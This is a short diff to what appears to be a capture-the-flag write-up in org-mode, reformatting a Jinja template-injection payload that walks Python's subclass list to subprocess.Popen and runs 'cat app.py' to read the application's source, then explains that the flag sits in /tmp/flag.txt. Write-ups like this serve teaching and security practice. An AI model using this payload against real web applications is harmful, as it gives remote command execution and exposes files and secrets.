@@ -69,7 +69,8 @@ In my case it was index =286=. Experiment with calling the process. In the end y
 
 #+CAPTION: Getting the file contents
 #+begin_src javascript
-{{ ''.__class__.__mro__[1].__subclasses__()[286]('cat app.py',shell=True,stdout=-1).communicate()[0].strip()}}
+{{ ''.__class__.__mro__[1].__subclasses__()[286]('cat app.py',shell=True,stdout=-1)
+   .communicate()[0].strip()}}
 #+end_src
 
 The sourcecode is then shown on the webpage. Reading it shows there is a =magic= function that encodes/decodes the flag. It does this by reading the flag from =/tmp/flag.txt=, this flag is set there during the =supervisor= startup and is not readable for the application.
